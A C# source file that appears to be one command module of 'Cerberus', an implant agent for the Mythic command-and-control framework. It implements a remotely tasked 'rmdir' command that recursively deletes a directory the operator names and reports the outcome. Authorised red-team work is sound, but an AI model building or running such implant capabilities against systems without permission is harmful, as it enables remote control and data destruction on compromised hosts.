using Models.Tasks;

using Extend;

using System.IO;
using System.Text;

namespace Tasks.Commands
{
    public class DeleteDirectory : CerberusCommand
    {
        public override string Name => "rmdir";

        public override MythicTaskResult Execute(MythicTask task)
        {
            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<RmdirParam>();
            MythicTaskResult result;
            

            if (Arguments is null || Arguments.path is null)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "No path provided",
                    completed = true,
                    status = "Error",
                    error = "No path provided"
                };

                return result;
            }

            Directory.Delete(Arguments.path, Arguments.recurse);

            if (!Directory.Exists(Arguments.path))
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = $"{Arguments.path} deleted",
                    completed = true,
                    status = "success"
                };

                return result;
            }

            result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = $"Failed to delete {Arguments.path}",
                completed = true,
                status = "Error",
                error = $"Failed to delete {Arguments.path}"
            };

            return result; 
        }
    }

    public class RmdirParam
    {
        public string path { get; set; }
        public bool recurse { get; set; }
    }
}
